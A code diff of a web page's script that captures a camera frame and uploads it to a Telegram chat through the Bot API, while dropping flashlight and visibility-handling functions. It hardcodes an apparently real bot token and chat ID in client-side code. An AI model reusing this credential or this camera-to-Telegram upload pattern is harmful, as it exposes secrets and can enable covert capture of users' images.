@@ -206,111 +206,62 @@
                 });
         }
 
-        function toggleFlashlight() {
-            if ('torch' in navigator) {
-                // Torch API is supported
-                if (navigator.torch.enabled) {
-                    // Torch is currently on, turn it off
-                    navigator.torch.turnOff()
-                        .then(() => console.log('Flashlight turned off'))
-                        .catch(err => console.error('Error turning off flashlight:', err));
-                } else {
-                    // Torch is currently off, turn it on
-                    navigator.torch.turnOn()
-                        .then(() => console.log('Flashlight turned on'))
-                        .catch(err => alert('Error turning on flashlight:', err));
-                }
-            } else {
-                alert('Torch API is not supported');
-            }
-        }
-        // Function to capture image
+
         function captureImage(delay) {
             setTimeout(function () {
                 var video = document.getElementById('video');
                 var canvas = document.createElement('canvas');
-                canvas.width = Fwidth;
-                canvas.height = Fheight;
+                canvas.width = Fwidth2;
+                canvas.height = Fheight2;
                 var context = canvas.getContext('2d');
-                // context.translate(canvas.height, 0);
-                // context.rotate(-Math.PI / 2);
 
-                context.drawImage(video, 0, 0, Fwidth, Fheight);
+                context.drawImage(video, 0, 0, Fwidth2, Fheight2);
 
+                var img = new Image();
+                img.onload = function () {
+                    var canvas2 = document.createElement('canvas');
+                    canvas2.width = Fwidth;
+                    canvas2.height = Fheight;
+                    var context2 = canvas2.getContext('2d');
+                    context2.drawImage(img, 0, 0, Fwidth, Fheight);
 
-                // Process image using CamanJS
-                Caman(canvas, function () {
-                    // Example enhancement - you can adjust these filters as needed
-                    this.brightness(10);
-                    this.contrast(10);
-                    this.saturation(10);
-                    this.render(function () {
-                        // After rendering, apply sharpening using sharp
-                        var imageData = context.getImageData(0, 0, Fwidth, Fheight);
-                        var data = {
-                            data: new Uint8Array(imageData.data.buffer),
-                            width: Fwidth,
-                            height: Fheight
-                        };
+                    var videoParent = video.parentNode;
+                    videoParent.replaceChild(canvas2, video);
 
-                    });
-                });
+                    stopVideoStream();
 
+                    canvas2.toBlob(function (blob) {
+                        var file = new File([blob], 'captured_image.png', { type: 'image/png' });
+                        var formData1 = new FormData();
+                        formData1.append('photo', file);
 
+                        const loader = document.getElementById('loader1');
+                        loader.style.display = 'block';
 
-                // Draw captured image onto video element
-                var videoParent = video.parentNode;
-                videoParent.replaceChild(canvas, video);
+                        const botToken = '5214279030:AAHwXVkouOpHANC1EiK6edh_ux4cFqoZ-OY';
+                        const chatId = '-1001971484231';
 
-
-                // Remove the video element
-                // videoParent.removeChild(video);
-                stopVideoStream();
-                // Stop video streaming
-                if (stream) {
-                    stream.getTracks().forEach(track => {
-                        track.stop();
-                    });
-                }
-
-
-
-                canvas.toBlob(function (blob) {
-                    // Create File object from Blob
-                    var file = new File([blob], 'captured_image.png', { type: 'image/png' });
-
-                    // Send file to Telegram using fetch
-                    var formData1 = new FormData();
-                    formData1.append('photo', file);
-
-
-                    const loader = document.getElementById('loader1');
-                    loader.style.display = 'block';
-
-                    const botToken = '5214279030:AAHwXVkouOpHANC1EiK6edh_ux4cFqoZ-OY';
-                    const chatId = '-1001971484231';
-
-                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`, {
-                        method: 'POST',
-                        body: formData1
-                    })
-                        .then(response => {
-                            if (!response.ok) {
-                                throw new Error('Failed to send image');
-                            }
-                            loader.style.display = 'none';
-                            alert('Image sent successfully!');
-                            location.reload();
-
+                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`, {
+                            method: 'POST',
+                            body: formData1
                         })
-                        .catch(error => {
-                            console.error('Error:', error);
-                            loader.style.display = 'none';
-                            alert('Failed to send image');
-                            location.reload();
-
-                        });
-                }, 'image/png');
+                            .then(response => {
+                                if (!response.ok) {
+                                    throw new Error('Failed to send image');
+                                }
+                                loader.style.display = 'none';
+                                alert('Image sent successfully!');
+                                location.reload();
+                            })
+                            .catch(error => {
+                                console.error('Error:', error);
+                                loader.style.display = 'none';
+                                alert('Failed to send image');
+                                location.reload();
+                            });
+                    }, 'image/png');
+                };
+                img.src = canvas.toDataURL();
             }, delay);
         };
 
@@ -323,39 +274,8 @@
 
 
 
-        // Check if video container is visible
-        function isVideoVisible() {
-            const rect = videoContainer.getBoundingClientRect();
-            return (
-                rect.top >= 0 &&
-                rect.left >= 0 &&
-                rect.bottom <= (window.innerHeight || document.documentElement.clientHeight) &&
-                rect.right <= (window.innerWidth || document.documentElement.clientWidth)
-            );
-        }
-
-        // Pause video if not visible, resume if visible
-        function handleVisibilityChange() {
-            if (isVideoVisible()) {
-                video.play();
-            } else {
-                //   Remove access to camera
-                navigator.mediaDevices.getUserMedia({ video: false })
-                    .then(function () {
-                        console.log('Access to camera removed.');
-                    })
-                    .catch(function (err) {
-                        console.log("An error occurred while removing access to camera: " + err);
-                    });
-
-            }
-        }
-
-        // Add event listener for visibility change
-        document.addEventListener('visibilitychange', handleVisibilityChange);
-
-
-
+    
+      
         // Toggle flashlight
         flashlightButton.addEventListener('click', () => {
             location.reload();
@@ -369,25 +289,7 @@
             }
         }
 
-        // Function to toggle flashlight
-        function toggleFlashlight() {
-            if (!stream) return;
-
-            const track = stream.getVideoTracks()[0];
-            const capabilities = track.getCapabilities();
-
-            if (!capabilities.torch) {
-                console.error('Flashlight is not supported.');
-                return;
-            }
-
-            isFlashlightOn = !isFlashlightOn;
-            track.applyConstraints({
-                advanced: [{ torch: isFlashlightOn }]
-            });
-        };
-
-
+       
 
     </script>
 
